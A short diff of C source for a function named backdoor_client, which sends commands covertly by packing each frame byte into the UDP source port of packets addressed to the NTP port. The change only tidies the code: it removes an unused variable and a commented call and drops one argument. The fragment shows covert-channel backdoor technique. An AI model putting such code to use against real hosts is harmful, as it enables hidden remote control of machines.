@@ -17,7 +17,6 @@ int closing;
 
 void backdoor_client(uint32 ipaddr, int dport, int duplex)
 {
-	int sock;
 //	struct sockaddr_in saddr;
 	char command[MAX_LEN];
 	pthread_t list_thread;
@@ -75,13 +74,13 @@ void backdoor_client(uint32 ipaddr, int dport, int duplex)
 //			sendto(sock, enc, FRAM_SZ, 0, (struct sockaddr *)&saddr, sizeof(saddr));
 
 //			free(enc);
-//			sendto(sock, frame, FRAM_SZ, 0, (struct sockaddr *)&saddr, sizeof(saddr));
+
 			src_port = (SIGNTR << 8) + frame[i];
 			dst_port = PORT_NTP;
 
 //			printf("Src: %d\n", src_port);
 			
-			_sendUDP(ipaddr, src_port, dst_port, TRUE);
+			_sendUDP(ipaddr, src_port, dst_port);
 			
 			usleep(SLEEP_TIME);
 		}
